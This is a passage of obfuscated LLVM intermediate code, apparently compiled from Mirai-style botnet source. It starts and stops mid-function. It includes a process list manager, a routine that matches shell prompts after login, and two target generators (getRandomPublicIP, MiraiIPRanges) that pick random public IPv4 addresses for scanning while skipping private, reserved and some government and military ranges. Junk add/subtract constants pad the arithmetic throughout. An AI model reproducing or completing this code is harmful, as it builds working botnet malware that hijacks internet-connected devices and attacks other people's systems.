; <label>:31:                                     ; preds = %23
  %32 = load i32*, i32** @pids, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = load i32*, i32** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  store i32 %36, i32* %40, align 4
  br label %41

; <label>:41:                                     ; preds = %31
  %42 = load i32, i32* %4, align 4
  %43 = add i32 %42, 1119013130
  %44 = add i32 %43, 1
  %45 = sub i32 %44, 1119013130
  %46 = add i32 %42, 1
  store i32 %45, i32* %4, align 4
  br label %23

; <label>:47:                                     ; preds = %23
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* @numpids, align 8
  %51 = add i64 %50, 8874170291063045500
  %52 = sub i64 %51, 1
  %53 = sub i64 %52, 8874170291063045500
  %54 = sub i64 %50, 1
  %55 = getelementptr inbounds i32, i32* %49, i64 %53
  store i32 %48, i32* %55, align 4
  %56 = load i32*, i32** @pids, align 8
  %57 = bitcast i32* %56 to i8*
  call void @free(i8* %57) #5
  %58 = load i32*, i32** %3, align 8
  store i32* %58, i32** @pids, align 8
  %59 = load i32, i32* %2, align 4
  store i32 %59, i32* %1, align 4
  br label %60

; <label>:60:                                     ; preds = %47, %8
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.472, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %119

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %86, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %84

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = add i64 0, -7340020363225039537
  %30 = sub i64 %29, %28
  %31 = sub i64 %30, -7340020363225039537
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %82, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, -4135452105065148525
  %45 = sub i64 %44, %43
  %46 = add i64 %45, -4135452105065148525
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %82, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = add i64 0, 1797817341357984589
  %60 = sub i64 %59, %58
  %61 = sub i64 %60, 1797817341357984589
  %62 = sub i64 0, %58
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 13
  br i1 %66, label %82, label %67

; <label>:67:                                     ; preds = %52
  %68 = load i8*, i8** %3, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 0, 1343924146227765791
  %75 = sub i64 %74, %73
  %76 = sub i64 %75, 1343924146227765791
  %77 = sub i64 0, %73
  %78 = getelementptr inbounds i8, i8* %71, i64 %76
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 10
  br label %82

; <label>:82:                                     ; preds = %67, %52, %37, %22
  %83 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %81, %67 ]
  br label %84

; <label>:84:                                     ; preds = %82, %18
  %85 = phi i1 [ false, %18 ], [ %83, %82 ]
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %7, align 4
  %88 = sub i32 %87, 1421550648
  %89 = add i32 %88, 1
  %90 = add i32 %89, 1421550648
  %91 = add nsw i32 %87, 1
  store i32 %90, i32* %7, align 4
  br label %18

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %3, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 0, %98
  %100 = add i64 0, %99
  %101 = sub i64 0, %98
  %102 = getelementptr inbounds i8, i8* %96, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %92
  store i32 1, i32* %2, align 4
  br label %120

; <label>:113:                                    ; preds = %92
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 0, 1
  %117 = sub i32 %115, %116
  %118 = add nsw i32 %115, 1
  store i32 %117, i32* %6, align 4
  br label %11

; <label>:119:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %120

; <label>:120:                                    ; preds = %119, %112
  %121 = load i32, i32* %2, align 4
  ret i32 %121
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 198
  br i1 %105, label %106, label %114

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 51
  br i1 %109, label %110, label %114

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %130, label %114

; <label>:114:                                    ; preds = %110, %106, %102
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 203
  br i1 %117, label %118, label %126

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 113
  br i1 %125, label %130, label %126

; <label>:126:                                    ; preds = %122, %118, %114
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sge i32 %128, 224
  br label %130

; <label>:130:                                    ; preds = %126, %122, %110, %98, %94, %86, %78, %66, %54, %42, %34, %30, %18, %14
  %131 = phi i1 [ true, %122 ], [ true, %110 ], [ true, %98 ], [ true, %94 ], [ true, %86 ], [ true, %78 ], [ true, %66 ], [ true, %54 ], [ true, %42 ], [ true, %34 ], [ true, %30 ], [ true, %18 ], [ true, %14 ], [ %129, %126 ]
  br i1 %131, label %132, label %145

; <label>:132:                                    ; preds = %130
  %133 = call i32 @rand() #5
  %134 = srem i32 %133, 223
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = call i32 @rand() #5
  %137 = srem i32 %136, 255
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %139 = call i32 @rand() #5
  %140 = srem i32 %139, 255
  %141 = trunc i32 %140 to i8
  store i8 %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %142 = call i32 @rand() #5
  %143 = srem i32 %142, 255
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:145:                                    ; preds = %130
  %146 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 16, i32 16, i1 false)
  %147 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %148 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %153 = zext i8 %152 to i32
  %154 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %155 = zext i8 %154 to i32
  %156 = call i32 (i8*, i8*, ...) @szprintf(i8* %147, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %149, i32 %151, i32 %153, i32 %155)
  %157 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %158 = call i32 @inet_addr(i8* %157) #5
  ret i32 %158
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
